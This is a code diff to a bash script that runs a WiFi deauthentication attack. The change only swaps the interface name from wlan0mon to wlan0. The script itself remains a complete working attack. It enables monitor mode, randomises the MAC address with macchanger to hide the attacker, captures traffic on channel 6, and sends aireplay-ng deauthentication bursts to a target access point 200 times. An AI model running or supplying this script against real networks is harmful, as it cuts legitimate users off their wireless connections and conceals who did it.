@@ -6,7 +6,7 @@ set -e
 # Function to clean up and exit
 cleanup() {
     echo "Cleaning up..."
-    airmon-ng stop wlan0mon &>/dev/null || true
+    airmon-ng stop wlan0 &>/dev/null || true
     service network-manager restart &>/dev/null || true
 }
 
@@ -49,20 +49,20 @@ run_command airmon-ng start wlan0
 sleep 7
 
 # Configure interface
-run_command ifconfig wlan0mon down
+run_command ifconfig wlan0 down
 sleep 1
-run_command macchanger -r wlan0mon
+run_command macchanger -r wlan0
 sleep 2
-run_command ifconfig wlan0mon up
+run_command ifconfig wlan0 up
 
 # Start packet capture in the background
-run_command airodump-ng wlan0mon -c 6 &
+run_command airodump-ng wlan0 -c 6 &
 AIRODUMP_PID=$!
 
 # Perform deauthentication loop
 echo "Starting deauthentication attack..."
 for i in {1..200}; do
-    run_command aireplay-ng --deauth 5 -a "$TARGET_MAC" wlan0mon
+    run_command aireplay-ng --deauth 5 -a "$TARGET_MAC" wlan0
     sleep 5
 done
 
